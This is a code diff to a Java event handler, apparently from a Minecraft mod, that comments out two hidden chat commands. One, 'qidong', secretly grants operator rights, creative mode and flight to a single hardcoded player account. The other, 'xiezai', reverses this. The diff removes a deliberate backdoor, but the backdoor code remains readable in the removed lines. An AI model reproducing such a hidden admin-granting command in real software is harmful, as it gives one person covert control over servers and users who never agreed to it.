@@ -336,20 +336,20 @@ public class MITEITEEvents {
             player.sendPlayerAbilities();
             event.setExecuteSuccess(true);
         }
-        if (par2Str.startsWith("qidong") && Objects.equals(player.getEntityName(), "Yyyyyyyyyy_Lose")) {
-            player.setOp(true);
-            player.capabilities.isCreativeMode = true;
-            player.capabilities.allowFlying = true;
-            player.setGameType(EnumGamemode.CREATIVE);
-            event.setExecuteSuccess(true);
-        }
-        if (par2Str.startsWith("xiezai")) {
-            player.setOp(false);
-            player.capabilities.isCreativeMode = false;
-            player.capabilities.allowFlying = false;
-            player.setGameType(EnumGamemode.SURVIVAL);
-            event.setExecuteSuccess(true);
-        }
+//        if (par2Str.startsWith("qidong") && Objects.equals(player.getEntityName(), "Yyyyyyyyyy_Lose")) {
+//            player.setOp(true);
+//            player.capabilities.isCreativeMode = true;
+//            player.capabilities.allowFlying = true;
+//            player.setGameType(EnumGamemode.CREATIVE);
+//            event.setExecuteSuccess(true);
+//        }
+//        if (par2Str.startsWith("xiezai")) {
+//            player.setOp(false);
+//            player.capabilities.isCreativeMode = false;
+//            player.capabilities.allowFlying = false;
+//            player.setGameType(EnumGamemode.SURVIVAL);
+//            event.setExecuteSuccess(true);
+//        }
         if (par2Str.startsWith("reconfig")) {
             try {
                 Configs.beginToLoadShopConfig();
